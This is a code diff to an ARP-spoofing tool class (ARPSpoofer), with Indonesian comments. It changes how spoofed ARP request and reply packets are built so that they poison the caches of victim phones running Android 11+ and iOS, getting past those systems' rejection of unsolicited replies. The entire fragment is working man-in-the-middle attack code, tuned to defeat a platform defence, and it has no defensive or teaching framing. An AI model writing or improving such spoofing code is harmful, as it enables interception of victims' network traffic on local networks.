@@ -208,7 +208,7 @@ class ARPSpoofer:
         #    cache pada Android 11+/iOS yang mengabaikan unsolicited reply (arp_accept=0) &
         #    memicu NUD pulih ke router bila hanya reply. hwdst = target_mac (unicast ke korban).
         arp_reply = ARP(op="is-at", psrc=spoof_ip, pdst=target_ip, hwsrc=hwsrc, hwdst=target_mac)
-        arp_request = ARP(op="who-has", psrc=spoof_ip, pdst=target_ip, hwsrc=hwsrc, hwdst=target_mac)
+        arp_request = ARP(op="who-has", psrc=spoof_ip, pdst=target_ip, hwsrc=hwsrc, hwdst="00:00:00:00:00:00")
         return [ether / arp_reply, ether / arp_request]
 
     def _build_restore_packets(self, victim_ip: str, victim_mac: str, gateway_ip: str, gateway_mac: str) -> Tuple[List[Ether], List[Ether]]:
